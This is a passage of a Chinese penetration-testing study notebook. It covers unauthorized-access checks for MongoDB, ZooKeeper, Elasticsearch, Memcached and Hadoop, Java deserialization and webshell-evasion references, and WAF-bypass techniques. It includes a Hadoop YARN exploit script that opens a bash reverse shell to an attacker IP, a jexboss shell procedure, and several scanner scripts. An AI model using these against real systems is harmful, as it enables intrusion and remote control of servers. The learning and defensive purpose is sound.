except Exception as e:
	error = e.args
	print('[-] -&gt; {}:{} error : {}'.format(ip, port, error))
</code></pre>
<pre><code>python3 mongodb_unauth.py 192.168.175.1 27017
</code></pre>
<hr>
<h2><a id="ZooKeeper_1351"></a>ZooKeeper</h2>
<p>默认端口：2181、2171</p>
<pre><code>ls / 	#查看所有节点 
get /	#获取某个节点信息
</code></pre>
<p>参考资料：</p>
<pre><code>https://blog.csdn.net/lihao21/article/details/51778255
https://www.cnblogs.com/wushijin/p/11654076.html

</code></pre>
<p>脚本检测</p>
<pre><code># coding=utf-8
import socket


def get_plugin_info():
    plugin_info = {
        "name": "Zookeeper未授权访问",
        "info": "Zookeeper Unauthorized access",
        "level": "中危",
        "type": "未授权访问",
        "author": "c4bbage@qq.com",
        "url": "https://hackerone.com/reports/154369",
        "keyword": "server:Zookeeper",
        "source": 1
    }
    return plugin_info


def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        flag = "envi"
        # envi
        # dump
        # reqs
        # ruok
        # stat
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'Environment' in data:
            return u"Zookeeper Unauthorized access"
    except:
        pass


def main():
    ip = "1.1.1.1"
    print check(ip, 2181, 2)

if __name__ == '__main__':
    main()
</code></pre>
<pre><code>https://github.com/ysrc/xunfeng/tree/master/vulscan/vuldb
</code></pre>
<hr>
<h2><a id="Elasticsearch_1420"></a>Elasticsearch</h2>
<p>默认端口：9200</p>
<pre><code>http://localhost:9200/_plugin/head/ 	web管理界面
http://localhost:9200/_cat/indices
htp:// localhost:9200/_river/_search	查看数据库敏感信息
http://localhost:9200/_nodes 			查看节点数
</code></pre>
<p>脚本检测：</p>
<pre><code># coding:utf-8
# elasticsearch未授权检测脚本
# author：ske
# usage: python3 elasticsearch_unauth.py ip port
# 默认端口9200
# http://localhost:9200/_plugin/head/ web管理界面
# http://localhost:9200/_cat/indices
# http://localhost:9200/_river/_search 查看数据库敏感信息
# http://localhost:9200/_nodes 查看节点数据

import sys
from elasticsearch import Elasticsearch
import requests
import json

ip = sys.argv[1]
port = int(sys.argv[2]) # 9200
try:
    es = Elasticsearch("{}:{}".format(ip, port), timeout=5)  # 连接Elasticsearch,延时5秒
    es.indices.create(index='unauth_text')
    print('[+] 成功连接 ：{}'.format(ip))
    print('[+] {} -&gt; 成功创建测试节点unauth_text'.format(ip))
    es.index(index="unauth_text", doc_type="test-type", id=2, body={"text": "text"})
    print('[+] {} -&gt; 成功往节点unauth_text插入数据'.format(ip))
    ret = es.get(index="unauth_text", doc_type="test-type", id=2)
    print('[+] {} -&gt; 成功获取节点unauth_text数据 : {}'.format(ip, ret))
    es.indices.delete(index='unauth_text')
    print('[+] {} -&gt; 清除测试节点unauth_text数据'.format(ip))
    print('[ok] {} -&gt; 存在ElasticSearch未授权漏洞'.format(ip))

    print('尝试获取节点信息：↓')
    text = json.loads(requests.get(url='http://{}:{}/_nodes'.format(ip, port), timeout=5).text)
    nodes_total = text['_nodes']['total']
    nodes = list(text['nodes'].keys())
    print('[ok] {} -&gt; [{}] : {}'.format(ip, nodes_total, nodes))

except Exception as e:
    error = e.args
    print('[-] -&gt; {}  error : {}'.format(ip, error))
</code></pre>
<pre><code>python3 elasticsearch_unauth.py 192.168.1.4 9200
</code></pre>
<hr>
<h2><a id="Memcache_1477"></a>Memcache</h2>
<p>默认端口11211</p>
<p>提示连接成功表示漏洞存在</p>
<pre><code>telnet &lt;target&gt; 11211，或 nc -vv &lt;target&gt; 11211
</code></pre>
<p>Memcached端口是对外开放的，用nc或Telne可以直接登录，查看信息，增加修改都可以<br>
<strong>修复建议</strong></p>
<pre><code>memcached设置监听内网或配置防火墙限制非必要的远程访问
</code></pre>
<p>参考</p>
<pre><code>https://www.cnblogs.com/mrhonest/p/10881389.html
</code></pre>
<hr>
<h2><a id="Hadoop_1497"></a>Hadoop</h2>
<p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构<br>
用户可以在不了解分布式底层细节的情况下，开发分布式程序<br>
充分利用集群的威力进行高速运算和存储<br>
在默认情况下，Hadoop允许任意用户访问管理接口</p>
<p>poc:</p>
<pre><code>
#!/usr/bin/env python
 
import requests
 
target = 'http://127.0.0.1:8088/'
lhost = '192.168.220.137' # put your local host ip here, and listen at port 9999
 
url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1' % lhost,
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
修改exploit.py中的反弹IP
python exploit.py

</code></pre>
<p>HDFS</p>
<pre><code>NameNode	默认端口	50070 
DataNode	默认端口	50075
httpfs		默认端口	14000
journalnode	默认端口	8480 
</code></pre>
<p>YARN （JobTracker ）</p>
<pre><code>ResourceManager	默认端口	8088 
Jobtracker		默认端口	50030 
TaskTracker		默认端口	50060 
</code></pre>
<p>Hue默认端口8080</p>
<p>YARN（JobTracker）</p>
<pre><code>master			默认端口	6001
regionserver	默认端口	60030 
</code></pre>
<p>hive- server2默认端口1000</p>
<p>spark- jdbcserver默认端口10003</p>
<p>开启身份验证，防止未经授权用户访问</p>
<hr>
<h2><a id="Couchdb_1567"></a>Couchdb</h2>
<p>默认端口5984</p>
<p>在local.ini配置中：<br>
bind_address = 设置为0.0.0.0则存在未授权访问</p>
<p>直接加端口进行访问即可<br>
<strong>exp：</strong></p>
<pre><code>https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py
</code></pre>
<hr>
<h2><a id="Ldap_1581"></a>Ldap</h2>
<p>使用工具ldap admin直接连接即可</p>
<p>防御措施：</p>
<pre><code>https://www.cnblogs.com/mrhonest/p/10948657.html   --建议
https://blog.csdn.net/u011607971/article/details/86378361   --管理方法
</code></pre>
<p>未授权漏洞总结：</p>
<pre><code>https://github.com/f1veT/VulScan/find/master    --Vulscan
https://github.com/ysrc/xunfeng/tree/master/vulscan/vuldb   --vuldb
</code></pre>
<hr>
<h2><a id="2222_JBOSS_1598"></a>2.2.2.2 JBOSS未授权访问</h2>
<p>Jboss未授权访问</p>
<p>vulhub漏洞平台可以复现，启用环境位置：vulhub-jboss-cve-2017-7504</p>
<pre><code>docker-compose up -d
</code></pre>
<p>访问8080端口无账号密码就可进入</p>
<p>linux-kali-exp</p>
<pre><code>git clone https://github.com/joaomatosf/jexboss
cd jexboss 
python jexboss py
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200918171030823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>python3 jexboss.py IP+port
</code></pre>
<p>执行工具会依次检测一下项目，有漏洞就会显示红色的: VULNERABLE(易受攻击的)，工具就会根据找到容易受到攻击的点，进行利用</p>
<p>然后选择YES，就可以获得shell了</p>
<hr>
<h2><a id="223__1626"></a>2.2.3 远程代码执行漏洞</h2>
<h2><a id="2231_Java_1627"></a>2.2.3.1 Java下奇怪的命令执行</h2>
<p><strong>前言</strong></p>
<p>使用ProcessBuilder</p>
<pre><code>ProcessBuilder pb=new ProcessBuilder(cmd)；
pb.start();
</code></pre>
<p>使用Runtime</p>
<pre><code>Runtime.getRuntime().exec(cmd)
</code></pre>
<p>也就是说上面cmd参数可控的情况下，均存在命令执行的问题。但是话题回来，不太清楚大家是否遇到过java命令执行的时候，无论是windows还是linux环境下，带有 |，&lt;，&gt; 等符号的命令没办法正常执行。所以今天就进入底层看看这两个东西</p>
<p><strong>差别</strong><br>
这里只讲解下跟进 java. lang, Runtime#exec的构造方法，exec的构造方法有以下几种情况,其实根据传入的变量我们大概可以区分的了，一个是根据 String command，也就是直接传入一个字符串，另一个是根据 String cmdarrayu[]，也就是传入一个数组</p>
<p>需要知道Runtime.getRuntime{}.exec{} 的底层实际上也是 ProcessBuilder</p>
<p>getRuntime{}.exec{} 如果直接传入字符串会经过String Tokenizer的分割，进而破坏其原本想要表达的意思</p>
<p>https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html<br>
详细了解下这篇文章的讲解</p>
<p><strong>总结：</strong></p>
<p>其实java已经尽量规避命令执行的安全问题，JDK沙盒机制会进行 checkExec，执行命令的机制就是仅仅检查并执行命令数组中的第一个，而分隔符后面的所有东西都是默认为被执行程序的参数，所以 getRuntime().exec() 通过传入字符串执行命令的时候，应该尽量避免使用空格，用了空格可能会改变这条命令本身想要表达的意思</p>
<p>所以在Java下如果遇到复杂的命令执行，且参数只能如下所示，且只有一个位置可以控制的话,建议使用base64的编码方式，windows下可以使用 powershll的base64</p>
<p>Java的反序列化框架利用框架yso，以及一些shiro这类反序列化导致的命令执行实际上很多是用了getRuntime来达到命令执行的目的，且就像我们上面说的，可控位置比较固定，执行复杂命令会出现执行不了</p>
<p><strong>Reference</strong></p>
<pre><code>sh-or-getting-shell-environment-from
</code></pre>
<hr>
<h2><a id="2232_Shiro_1670"></a>2.2.3.2 Shiro反序列化记录</h2>
<p>漏洞搭建安装和复现：</p>
<pre><code>https://cloud.tencent.com/developer/article/1078421
https://blog.knownsec.com/2016/08/apache-shiro-java/
</code></pre>
<p><strong>Reference</strong></p>
<p>Pwn a CTF Platform with Java JRMP Gadget</p>
<pre><code>https://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html
https://open.appscan.io/article-862.html
https://www.jianshu.com/p/f10ad968e1b2
</code></pre>
<p>强网杯“彩蛋— Shiro1.2.4(SHRO550)漏洞之发散性思考</p>
<pre><code>该链接已失效，可查看书籍
</code></pre>
<p>Apache Shiro Java反序列化漏洞分析</p>
<pre><code>https://blog.knownsec.com/2016/08/apache-shiro-java/
https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/
</code></pre>
<p>知识盲区，需要脑补！！！！！</p>
<hr>
<h2><a id="2233_RMI_1703"></a>2.2.3.3 RMI-反序列化</h2>
<p><strong>参考</strong><br>
<strong>RM官方文档</strong></p>
<pre><code>https://xz.aliyun.com/t/4711#toc-3   ---浅显易懂的JAVA反序列化入门
java安全漫谈-04RM篇(1)		----如果看到可以找dayu我要
java安全漫谈04.RM篇(2)   --没找到（2）....
</code></pre>
<p>知识盲区，需要脑补！！！！！</p>
<hr>
<h2><a id="2234_JNDI_1715"></a>2.2.3.4 JNDI注入</h2>
<p>参考：（哎，知识盲区，加油脑补）</p>
<pre><code>https://www.freebuf.com/vuls/115849.html   --Jndi注入及Spring RCE漏洞分析
https://www.veracode.com/blog/research/exploiting-jndi-injections-java  --在Java中利用JNDI注入
https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html   --如何绕过高版本JDK的限制进行JNDI注入利用
</code></pre>
<p><strong>RPC</strong></p>
<pre><code>https://www.jianshu.com/p/2accc2840a1b  --如何给老婆解释什么是RPC
https://www.freebuf.com/column/189835.html   ---深入理解JNDI注入与Java反序列化漏洞利用
</code></pre>
<p><strong>ldap</strong></p>
<pre><code>https://www.cnblogs.com/wilburxu/p/9174353.html   --LDAP概念和原理介绍
https://www.jianshu.com/p/7e4d99f6baaf   --LDAP入门
https://blog.csdn.net/caoyujiao520/article/details/82762097  --LDAP入门使用
</code></pre>
<hr>
<h2><a id="2235_fastjson_1740"></a>2.2.3.5 fastjson漏洞浅析</h2>
<p><strong>前言</strong></p>
<p>Fastion是一个Java语言编写的高性能功能完善的JSON库。它采用一种“假定有序快速匹配"的算法，把JS0N Parse的性能提升到极致，是目前Java语言中最快的JSON库。 Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、We输出、 Android客户端等多种应用场景</p>
<p><strong>参考链接</strong></p>
<pre><code>https://www.freebuf.com/column/207439.html   ---如何绕过高版本JDK的限制进行JNDI注入
</code></pre>
<p>三个fastjson1.2…版本的poc，需要花很多时间来学习！！！</p>
<hr>
<h2><a id="2236_CVE201911043_PHP_1756"></a>2.2.3.6 CVE-2019-11043 PHP远程代码执行复现</h2>
<p><strong>简介</strong></p>
<p>相信大家都在满天的公众号预警里面看过很多,这里就一笔带过</p>
<p>2019年10月22日，国外安全研究员公开了一个PHP-FPM远程代码执行的漏洞EXP<br>
该漏洞是 Andrew Danau在某比赛解决一道CTF题目时发现，向目标服务器URL发送%0a符号时，服务返回异常发现的漏洞</p>
<p>2019年9月26日，PHP官方发布漏洞通告其中指出使用 Nginx + php-fpm的服务器在部分配置下存在远程代码执行漏洞且该配置已被广泛使用，危害较大，影响较为广泛相关工具已经公开</p>
<p><strong>Github地址如下:</strong></p>
<pre><code>https:/github.com/neex/phuip-fpizdam
</code></pre>
<hr>
<p>方法很多，我会写出来…后补！！！</p>
<hr>
<h2><a id="2237_java_webshell1_1775"></a>2.2.3.7 java webshell从入门到入狱系列1-基础篇</h2>
<p>本系列文章纯探讨技术交流，请勿使用本文探的技术构造恶意webshel非法入侵他人网站</p>
<p><strong>前言</strong></p>
<p>本系列，主要从webshell基础、 webshell的bypass技术（关键字、流量层、hook点逃逸）、后渗透的webshell维权（基于容器特性的隐式webshell、内存shell等）等方面和大家交流java中webshe‖的形式</p>
<p><strong>基础</strong></p>
<p><strong>java webshell种类</strong></p>
<p>现在大部分中间件容器，所能支持解析的后缀，主要是jsp，jspx 两种动态脚本为主，比如 tomcat容器中，默认能支持解析的动态脚本已经默认写在配置中了</p>
<pre><code> &lt;jsp-config&gt; 

&lt;jsp-property-group&gt; 

&lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt; 

&lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;
 
&lt;scripting-invalid&gt;true&lt;/scripting-invalid&gt; 

&lt;/jsp-property-group&gt; 

&lt;/jsp-config&gt;
</code></pre>
<p><strong>在目前常见的 webshel的后门种类,主要分如下几类：</strong></p>
<p>各种客户端的一句话 webshll （比如菜刀、冰蝎、蚁剑、c刀等常见客户端）、专门负责数据传输的webshell（与数据库进行交互）、Tune后门（基于 socks5协议的 reGeorg之类的）、小马（单纯的进行命令执行、单纯的进行文件管理/上传等功能)、大马（集成了文件管理、命令执行、数据库连接等多功能性大马）</p>
<p><strong>java执行命令方式</strong></p>
<p>在这节我们拿最基础的命令执行的来讨论，如何用多种方式写我们的负责命令执行的webshell</p>
<p>在java中，常见的能够执行命令的方式</p>
<p>java基础的webshell命令执行方式</p>
<p><strong>使用 java runtime exec()</strong></p>
<p>第一种常见的使，用 java.lang.Runtime 类进行执行系统命令，该方法也是目前市面上各种静态查杀 webshell 辅助工具首要盯着的目标，需要注意的是win 下和linux 需要区别对待，以及当使用多个命令组合使用注意坑。下面我们来看看代码。使用 Runtime类，调用exec执行命令返回一个Process对象,然后启一个 BufferedReader类，对返回的结果进行保存回显处理。执行exec的时候需要特别注意，带有|，&lt;，&gt; 等符号的命令需要使用如下代码的方式进行执行，要不然容易出错</p>
<p>讲解了webshell大部分能利用的机制：<br>
Java 执行系统命令的方法和原理<br>
用 ProcessBuilder 绕过检测<br>
使用 Java 反射机制绕过检测<br>
使用 Java 类加载机制绕过检测<br>
获得 Class 对象的四种方法</p>
<pre><code>https://cloud.tencent.com/developer/article/1180753   --利用Java反射和类加载机制绕过JSP后门检测
</code></pre>
<p>非常详细…</p>
<pre><code>https://javasec.org/javase/   --安全门
</code></pre>
<p><strong>熟悉下Java反射基础：</strong><br>
定义：<br>
java反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对<br>
于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象的功能称为java语言的反射机制</p>
<p><strong>java反射涉及的类:</strong></p>
<pre><code>cass类：代表类的实体,在运行的Java应用程序中表示类和接口
Field类：代表类的成员变量(类的属性)
Method类：代表类的方法
Constructor类：代表类的构造方法
</code></pre>
<p><strong>Class类中常见使用的</strong><br>
1）获取的类中的方法<br>
for Name(String className)：根据类名返回类的对象<br>
getName()：获得类的完整路径名字</p>
<p>2）获取类中属性相关</p>
<p>getFields()：获得所有公有的属性对象<br>
getDeclaredFields()：获得所有属性对象(带Declared的可以获取到私有private)</p>
<p>3）获得类中方法<br>
getMethods()：获得该类所有公有的方法<br>
getDeclaredMethod( String name, Class…&lt;?&gt; parameterTypes)：获得该类某个方法<br>
getDeclaredMethods()：获得该类所有方法</p>
<p><strong>Fed类常见使用的</strong><br>
equals(Object obj)：属性与ob相等则返回true<br>
get(Object obj)：获得obj中对应的属性值<br>
set(Object obj, Object value)：设置obj中对应属性值</p>
<p><strong>Method类</strong></p>
<p>invoke(object obj, Object…args) 传递 object对象及参数调用该对象对应的方法</p>
<p><strong>Constructor类</strong></p>
<p>newInstance(Object…initargs)：根据传递的参数创建类的对象</p>
<hr>
<h2><a id="2238_XMLdecoder__dayuThird_day_1880"></a>2.2.3.8 深究XMLdecoder  (dayu-Third day)</h2>
<p>Oracle关于这个 xmldecoder造成的漏洞的CVE编号分别是CVE2017-3506、CVE2017-10271、CVE2019-2725</p>
<p>最早关于CVE2017-3506的补丁只是根据 object标签进行了限制</p>
<p>而根据文章中讲解的继承关系 object替换成void即可，它们实际上是不受影响的，因此便出现了CVE-2017-10271，而针对CVE-2017-10271的补丁限定了所有具有执行的节点</p>
<p>但这次CVE-2019-2725主要是class标签，class标签可代替 object标签来生成对象，因此这次漏洞本质还是 xmldecoder的问题，而补丁也是针对class标签来处理的</p>
<pre><code>https://blog.csdn.net/fnmsd/article/details/89889144   --fnmsd作者-XMLDecoder解析流程分析
https://www.anquanke.com/post/id/180725   ---浅谈Weblogic反序列化——XMLDecoder的绕过史
</code></pre>
<p>只是盲区，需要脑补！！！！</p>
<hr>
<h2><a id="2239_FastJson__1898"></a>2.2.3.9 FastJson 反序列化学习</h2>
<p>这篇文章总结的非常好：</p>
<pre><code>http://www.lmxspace.com/2019/06/29/FastJson-反序列化学习/
</code></pre>
<p><strong>Reference</strong></p>
<pre><code>fastjson-remote-code-execute-poc：
https://github.com/shengqi158/fastjson-remote-code-execute-poc

Fastjson 1.2.24反序列化漏洞分析：
https://www.freebuf.com/vuls/178012.html

Fastjson反序列化漏洞研究：
https://www.cnblogs.com/mrchang/p/6789060.html

Fastjson反序列化之TemplatesImpl调用链：
https://p0rz9.github.io/2019/05/12/Fastjson反序列化之TemplatesImpl调用链/
</code></pre>
<hr>
<h2><a id="22310_Oracle_xml_1919"></a>2.2.3.10 Oracle 数据库安全思考之xml反序列化</h2>
<p>学习文章非常详细：</p>
<pre><code>https://my.oschina.net/u/4587690/blog/4452199
</code></pre>
<p>参考：</p>
<pre><code>http://obtruse.syfrtext.com/2018/07/oracle-privilege-escalation-via.html
</code></pre>
<hr>
<h2><a id="22311_Webshell_1933"></a>2.2.3.11 Webshell绕安全模式执行命令</h2>
<p>绕过方法总结：</p>
<pre><code>http://www.91ri.org/8700.html
</code></pre>
<p>EXP和poc：</p>
<pre><code>https://github.com/yangyangwithgnu/bypass_disablefunc_via_ld_preload
</code></pre>
<hr>
<h2><a id="22312_Java_XEE_1947"></a>2.2.3.12 Java 下的XEE漏洞</h2>
<p>该文章讲解了java xml下大部分的XEE漏洞原因和防御：</p>
<pre><code>http://www.lmxspace.com/2019/10/31/Java-XXE-总结/    --详细看看
https://xz.aliyun.com/t/3372    --有多余时间可以看看
</code></pre>
<p><strong>Reference</strong></p>
<pre><code>Java XXE注入修复问题填坑实录:
https://mp.weixin.qq.com/s/bTeJYzUN9T1u-KDZON5FiQ

修不好的洞，JDK的坑——从WxJava XXE注入漏洞中发现了一个对JDK的误会:
https://mp.weixin.qq.com/s/bTeJYzUN9T1u-KDZON5FiQ

XML_External_Entity_Prevention_Cheat_Sheet：
https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#Java

一个被广泛流传的XXE漏洞错误修复方案：
https://gv7.me/articles/2019/a-widely-circulated-xxe-bug-fix/

JAVA常见的XXE漏洞写法和防御：
https://blog.spoock.com/2018/10/23/java-xxe/
</code></pre>
<hr>
<h2><a id="22313_Solr_Velocity_1973"></a>2.2.3.13 Solr Velocity模板远程代码复现及利用指南</h2>
<pre><code>https://www.secpulse.com/archives/117281.html   --详细复现防御
https://www.cnblogs.com/bmjoker/p/11778478.html
https://govuln.com/topic/501/   --P牛解释
</code></pre>
<hr>
<h2><a id="22314_SolrRCEviaVelocitytemplate_1981"></a>2.2.3.14 Solr-RCE-via-Velocity-template</h2>
<pre><code>http://www.lmxspace.com/2019/11/03/Solr-RCE-via-Velocity-template/
</code></pre>
<p><strong>Reference</strong></p>
<pre><code>用Intellij idea搭建solr调试环境：
https://www.jianshu.com/p/4ceeb2c20002

http://lucene.apache.org/solr/guide/6_6/velocity-response-writer.html
</code></pre>
<hr>
<h2><a id="22315_java_webshell_2Bypass_1996"></a>2.2.3.15 java webshell 从入门到入狱系列2-攻防对抗之Bypass-上篇</h2>
<p>1）java反射bypass</p>
<p>2）反射的进阶版，通过结合利用byte字节码+反射的方式完全无任何痕迹的反射回显命令执行马</p>
<p>3）java 后门-unicode编码</p>
<hr>
<h2><a id="22316_java_webshell_3Bypass_2004"></a>2.2.3.16 java webshell 从入门到入狱系列3-攻防对抗之Bypass-中篇</h2>
<p>其他姿势载入webshell的技巧tip</p>
<p>JavaWeb 随机后门（远程下载文件）</p>
<p>Java URLClassLoader 动态加载jar包 webshell</p>
<p>openrasp （开源应用运行时自我保护）Bypass</p>
<hr>
<h2><a id="22317_java_webshell_4Bypass_2015"></a>2.2.3.17 java webshell 从入门到入狱系列4-攻防对抗之Bypass-下篇</h2>
<p>各家厂商早期针对流量层查杀 webshel的原理：</p>
<pre><code>https://xz.aliyun.com/t/6550
</code></pre>
<hr>
<h2><a id="22318_Javadayufourth_day_2023"></a>2.2.3.18 Java反序列化过程深究（dayu-fourth day）</h2>
<pre><code>https://www.sohu.com/a/357066711_257305
</code></pre>
<p>CVE-2017-3248<br>
CVE-2017-3248</p>
<p><strong>防护建议</strong></p>
<pre><code>可以在resolveclass和resovleproxyclass增加一些反序列化利用类的黑名单检查
</code></pre>
<hr>
<h2><a id="22319_Apache_Slorjmx_rmi_2038"></a>2.2.3.19 Apache Slor不安全配置远程代码执行漏洞复现及jmx rmi利用分析</h2>
<p>CVE-2019-12409</p>
<pre><code>https://wemp.app/posts/008ae6ed-9eee-4fc4-911c-7c603c8b884a?utm_source=bottom-latest-posts
</code></pre>
<p>该文章详细讲解复现！！！</p>
<hr>
<h2><a id="22320_java_2048"></a>2.2.3.20 java命令执行小细节</h2>
<pre><code>http://www.baizhiedu.com/article/1029
</code></pre>
<p>学习查看知识点，广告可以忽视！！！</p>
<hr>
<h2><a id="22321_JDKGadgets7u21_2056"></a>2.2.3.21 JDK反序列化Gadgets-7u21</h2>
<pre><code>https://xz.aliyun.com/t/6884
</code></pre>
<p>详细，真详细的文章！！</p>
<p>参考</p>
<pre><code>https://www.freebuf.com/vuls/175754.html

https://b1ue.cn/archives/176.html

https://gist.github.com/frohoff/24af7913611f8406eaf3

https://sec.xiaomi.com/article/41

https://www.cnblogs.com/rickiyang/p/11336268.html   ---javassist使用全解析
</code></pre>
<hr>
<h2><a id="22322_WeblogicT3CVE20192890Analysis_2078"></a>2.2.3.22 Weblogic-T3-CVE-2019-2890-Analysis</h2>
<pre><code>https://xz.aliyun.com/t/6904
</code></pre>
<p>详细复现！！</p>
<hr>
<h2><a id="22323_springbootactuators_2087"></a>2.2.3.23 spring-boot-actuators未授权漏洞</h2>
<pre><code>https://www.jianshu.com/p/3162ce30a853
https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
</code></pre>
<hr>
<h2><a id="22324_SEMCMS26_2095"></a>2.2.3.24 SEMCMS2.6后台文件上传漏洞审计</h2>
<pre><code>https://www.cesafe.com/html/6190.html
https://www.yir6.cn/Web/347.html   --Admin/SEMCMS_Upfile.php代码分析
</code></pre>
<hr>
<h2><a id="22325_lvyecmsgetshell_2102"></a>2.2.3.25 代码审计之lvyecms后台getshell</h2>
<pre><code>https://www.wenwenya.com/anquan/516051.html
https://webcache.googleusercontent.com/search?q=cache:9JJuN-bvrgwJ:https://www.secshi.com/22396.html+&amp;cd=3&amp;hl=zh-CN&amp;ct=clnk&amp;gl=hk
</code></pre>
<hr>
<h2><a id="22326_Log4jUnserializeAnalysis_2109"></a>2.2.3.26 Log4j-Unserialize-Analysis</h2>
<pre><code>https://xz.aliyun.com/t/7004
https://my.oschina.net/u/4587690/blog/4452130
</code></pre>
<p>两篇文章内容一致！详细介绍了CVE-2019-17571、CVE-2017-5645</p>
<hr>
<h2><a id="22327_JAVA_FastJson_2118"></a>2.2.3.27 JAVA反序列化- FastJson组件</h2>
<pre><code>https://xz.aliyun.com/t/7027
</code></pre>
<p>非常难，内容非常多！！！加油！！！这块比较难</p>
<hr>
<h2><a id="22328_Springsecuriyoauth2_CVE20181260_2126"></a>2.2.3.28 Spring-securiy-oauth2 (CVE-2018-1260)</h2>
<pre><code>https://blog.spoock.com/2018/05/13/cve-2018-1260/
</code></pre>
<p>文章内容复现类似，可分析查看…</p>
<hr>
<h2><a id="224_WAFbypassdayuFifth_day_2134"></a>2.2.4 WAF-bypass（dayu-Fifth day）</h2>
<p><img src="https://img-blog.csdnimg.cn/20200920201152558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2><a id="IPCDN_2138"></a>找真实IP，绕过CDN</h2>
<p>云waf一般可以通过此方法绕过</p>
<p><strong>识别CDN</strong></p>
<pre><code>ping www.baidu.com
dig www.baidu.com 
nslookup www.baidu.com
</code></pre>
<p>或者使用站长工具查看IP是否唯一等</p>
<p><strong>寻找真实的IP</strong><br>
DNS历史解析记录<br>
寻找DNS历史记录，找到后修改hos文件即可：</p>
<pre><code>http://site.ip138.com/www.baidu.com 

https://dnsdb.io/zh-cn/ 

https://x.threatbook.cn/ 

http://toolbar.netcraft.com/site_report?url= 

https://censys.io/ipv4?q=www.baidu.com 

http://viewdns.info/

https://community.riskiq.com/home 

https://securitytrails.com/list/apex_domain/jgbz.baidu.com
</code></pre>
<p><strong>RSS邮箱订阅，查看邮件源码</strong><br>
一般也会得到真实的IP地址，通过rss订阅的方式，可以查找到订阅的消息中真实IP<br>
或者在原始信息-头信息中（unknown[xx.xx.xx.xxIP])信息</p>
<p><strong>服务器向外请求（DNSLOG）</strong></p>
<pre><code>https://www.cnblogs.com/Xy--1/p/12896599.html
</code></pre>
<p><strong>同网段子域名信息</strong><br>
DNS服务器域名信息：</p>
<pre><code>google Public DNS（8.8.8.8，8.8.4.4）
OpenDNS（208.67.222.222，208.67.220.220）
OpenDNS Family（208.67.222.123，208.67.220.123）
Dyn DNS（216.146.35.35，216.146.36.36）
Comodo Secure（8.26.56.26，8.20.247.20）
UltraDNS（156.154.70.1，156.154.71.1）
Norton ConnectSafe（199.85.126.10，199.85.127.10）
</code></pre>
<h2><a id="https_2194"></a>https降级绕过</h2>
<p><img src="https://img-blog.csdnimg.cn/20200920203058897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章：https://zhuanlan.zhihu.com/p/202628255</p>
<hr>
<h2><a id="ssl_2201"></a>ssl问题绕过</h2>
<p>所以选用一个WAF不支持但是服务器支持的算法，选用TLSv1 256 bits ECDHE-RSA-AES256-SHA。就可以是WAF无法识别导致绕过</p>
<pre><code>curl --ciphers ECDHE-RSA-AES256-SHA https://waf-test.lab.local/ssl-cipher-test
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200920204626107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
WAF支持的算法如下：<br>
<strong>SSLv3</strong></p>
<pre><code>SSL_RSA_WITH_NULL_MD5

SSL_RSA_WITH_NULL_SHA

SSL_RSA_WITH_RC4_128_MD5

SSL_RSA_WITH_RC4_128_SHA

SSL_RSA_WITH_DES_CBC_SHA

SSL_RSA_WITH_3DES_EDE_CBC_SHA

SSL_RSA_EXPORT_WITH_RC4_40_MD5

SSL_RSA_EXPORT_WITH_DES40_CBC_SHA
</code></pre>
<p><strong>TLS/1.0-1.2</strong></p>
<pre><code>TLS_RSA_WITH_NULL_SHA256

TLS_RSA_WITH_AES_128_CBC_SHA

TLS_RSA_WITH_AES_256_CBC_SHA

TLS_RSA_EXPORT1024_WITH_RC4_56_MD5

TLS_RSA_EXPORT1024_WITH_RC4_56_SHA

TLS_RSA_WITH_AES_128_CBC_SHA256

TLS_RSA_WITH_AES_256_CBC_SHA256

TLS_RSA_WITH_RC4_128_MD5 = { 0x000x04 }

TLS_RSA_WITH_RC4_128_SHA = { 0x000x05 }

TLS_RSA_WITH_DES_CBC_SHA = { 0x000x09 }
</code></pre>
<p>参考文章：</p>
<pre><code>http://xdxd.love/2018/09/10/利用SSL问题绕过WAF文章分析/
</code></pre>
<hr>
<h2><a id="method__2260"></a>method 绕过</h2>
<p>1）改变method，get改post，post 改上传（还有cookies传值）<br>
